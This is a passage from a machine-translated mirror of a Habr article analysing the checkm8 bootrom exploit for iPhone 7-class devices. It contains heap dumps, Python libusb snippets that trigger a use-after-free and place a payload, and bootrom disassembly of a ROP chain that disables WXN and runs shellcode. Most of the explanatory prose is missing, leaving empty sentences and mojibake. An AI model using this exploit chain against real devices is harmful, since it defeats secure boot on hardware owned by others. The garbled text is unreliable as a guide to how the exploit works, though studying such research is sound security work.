00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p>     ,    <code>High Speed</code>  <code>Full Speed</code> ,     <code>IO</code> -.          , ,  ,      .      ,     . </p><br><h2 id="2-allokaciya-i-osvobozhdenie-io-bufera-bez-ochistki-globalnogo-sostoyaniya"> 2.    IO-     </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p>      <code>OUT</code> -   .      ,   <code>io_buffer</code>      .    <code>DFU</code>    <code>DFU_CLR_STATUS</code> ,      <code>DFU</code> . </p><br><h2 id="3-perezapis-usb_device_io_request-v-kuche-s-pomoschyu-use-after-free"> 3.  <code>usb_device_io_request</code>     <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>      <code>usb_device_io_request</code>        <code>t8010_overwrite</code> ,       . </p><br><p>  <code>t8010_nop_gadget</code>  <code>0x1800B0800</code>    <code>callback</code>  <code>next</code>  <code>usb_device_io_request</code> . </p><br><p> <code>t8010_nop_gadget</code>      ,         ,       <code>LR</code> , -    <code>free</code>  <code>callback</code> -  <code>usb_core_complete_endpoint_io</code> .  ,        ,          . </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code>   <code>INSECURE_MEMORY + 0x800</code> .  <code>INSECURE_MEMORY</code>     ,    <code>0x800</code>     <code>callback-chain</code> ,     . </p><br><h2 id="4-razmeschenie-poleznoy-nagruzki"> 4.    </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>            .      : </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode #  shell-code ... 0x1800B0180: t8010_handler #   usb- ... 0x1800B0400: 0x1000006a5 #     #  SecureROM (0x100000000 -&gt; 0x100000000) #        ... 0x1800B0600: 0x60000180000625 #     #  SecureRAM (0x180000000 -&gt; 0x180000000) #        0x1800B0608: 0x1800006a5 #     #    0x182000000  0x180000000 #           0x1800B0610: disabe_wxn_arm64 #    WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-ispolnenie-callback-chain"> 5.  <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>   <code>USB</code>     <code>usb_device_io_request</code>        .        ,       <code>callback</code> .       : </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18â†‘j bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48â†‘j bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p>  ,   <code>0x70</code>            .          <code>f(x)</code>   <code>f</code>  <code>x</code> . </p><br><p>      ,  <code>Unicorn Engine</code> .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p>      <code>iPhone 7</code>    . </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p>        .    ,          . </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p>  ,      ,    .   ,            ,   . </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p>         . </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code>  <code>0x1800B0000</code> .   <code>INSECURE MEMORY</code> ,     .    ,         : </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p>      ,          . </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64"> 5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p>   <code>WXN</code> (Write permission implies Execute-never),       <code>RW</code> .     <code>WXN</code>  -      . </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code> .       <code>BootROM</code>    ,     <code>INSECURE_MEMORY</code>  . </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p>     . </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p>      . </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p>    <code>shellcode</code> . </p><br><p>  ,   <code>callback-chain</code> â€”   <code>WXN</code>     <code>shellcode</code>  <code>RW</code> -. </p><br><h2 id="6-ispolnenie-shellcode"> 6.  <code>shellcode</code> </h2><br><p>  <code>shellcode</code>   <code>src/checkm8_arm64.S</code>   : </p><br><h4 id="61-perezapis-konfiguracionnyh-usb-deskriptorov"> 6.1.   <code>USB</code> - </h4><br><p>          <code>usb_core_hs_configuration_descriptor</code>  <code>usb_core_fs_configuration_descriptor</code> ,   .        .         <code>USB</code> -, <code>shellcode</code>  . </p><br><h4 id="62-izmenenie-usbserialnumber">  6.2ã€‚  <code>USBSerialNumber</code> </h4><br><p>   -   ,     <code>" PWND:[checkm8]"</code> .     ,    . </p><br><h4 id="63-perezapis-ukazatelya-obrabotchika-usb-zaprosov-na-novyy">  6.3ã€‚    <code>USB</code> -   </h4><br><p>     <code>USB</code> -       ,        . </p><br><h4 id="64-kopirovanie-obrabotchika-usb-zaprosov-v-trampoline-oblast-pamyati-0x1800afc00"> 6.4.   <code>USB</code> -  <code>TRAMPOLINE</code>   ( <code>0x1800AFC00</code> ) </h4><br><p>   <code>USB</code> -    <code>wValue</code>   <code>0xffff</code> ,    ,     .   ,         : <code>memcpy</code> , <code>memset</code>  <code>exec</code> (      ). </p><br><p>       . </p><br><h2 id="realizaciya-eksployta-na-bolee-nizkom-urovne-raboty-s-usb">         USB </h2><br><p>             <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="> Proof-of-Concept</a>  <code>checkm8</code>  <code>Arduino</code>  <code>Usb Host Shield</code> . PoC    <code>iPhone 7</code> ,         .   <code>iPhone 7</code>  <code>DFU</code>   <code>Usb Host Shield</code>       ,      <code>PWND:[checkm8]</code> ,       <code>USB</code> -         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> ( ,  -  ..).     ,       ,       <code>USB</code> -.      <a href="">USB_Host_Shield_2.0</a> .    , patch-    . </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="vmesto-zaklyucheniya">   </h2><br><p>       .    <code>checkm8</code>   . ,               .          jailbreak-. ,     jailbreak   <code>checkm8</code> â€” <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">checkra1n</a> .    ,  jailbreak       ( <code>A5</code>  <code>A11</code> )    <code>iOS</code> .      <code>iWatch</code> , <code>Apple TV</code>    . ,             . </p><br><p>  jailbreak,         Apple.   <code>checkm8</code>    verbose- <code>iOS</code> ,  <code>SecureROM</code>   <code>GID</code> -    .   ,   ,           <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="> JTAG/SWD </a> .        , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">    </a> ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="> </a> . ,   <code>checkm8</code> ,  <code>Apple</code>      . </p><br><h2 id="ssylki"> å‚è€ƒæ–‡çŒ® </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="> ipwndfu  LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN471668/">https://habr.com/ru/post/zh-CN471668/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN471658/index.html">ç”µè¯éª—å­ã€‚ è¢«å‘ŠçŸ¥å…¶ä»–éª—å­çš„ç¬¬ä¸€æ­¥</a></li>
<li><a href="../zh-CN471660/index.html">ç©å®¶å¿ƒç†è®²åº§</a></li>
<li><a href="../zh-CN471662/index.html">ç½‘ç»œ-javascriptèº«ä»½éªŒè¯ï¼Œæ··æ·†å’Œæœ¬æœºä»£ç ã€‚ ä½¿ç”¨r0ot-mi Webè§£å†³é—®é¢˜-å®¢æˆ·ç«¯ã€‚ ç¬¬ä¸€éƒ¨åˆ†</a></li>
<li><a href="../zh-CN471664/index.html">åœ¨ABBYYå®ä¹ ï¼šæ‚¨å¯ä»¥æˆä¸ºâ€œæ‚¨â€çš„å…¬å¸</a></li>
<li><a href="../zh-CN471666/index.html">ä½“éªŒiOSå¼€å‘äººå‘˜é€šè¿‡å·¥ä½œç­¾è¯ç§»å±…å¾·å›½çš„ç»å†</a></li>
<li><a href="../zh-CN471670/index.html">åœ¨æˆ˜æ–—ä¸­å°è¯•Jetpack Composeï¼Ÿ</a></li>
<li><a href="../zh-CN471676/index.html">ç”µè¯éª—å­ã€‚ ç¬¬äºŒæ­¥ï¼Œæˆ‘åˆ†è§£å¹¶è¿è¡Œåˆ°æœ€è¿‘çš„ATM</a></li>
<li><a href="../zh-CN471678/index.html">æŒ‰éœ€æ‰¿æ‹…æœåŠ¡</a></li>
<li><a href="../zh-CN471684/index.html">ä¸ºä»€ä¹ˆéœ€è¦ä¸ºNginxåˆ›å»ºæ¨¡å—</a></li>
<li><a href="../zh-CN471686/index.html">AWSå¦‚ä½•é…¿é€ å…¶å¼¹æ€§æœåŠ¡ã€‚ æœåŠ¡å™¨å’Œæ•°æ®åº“æ‰©å±•</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>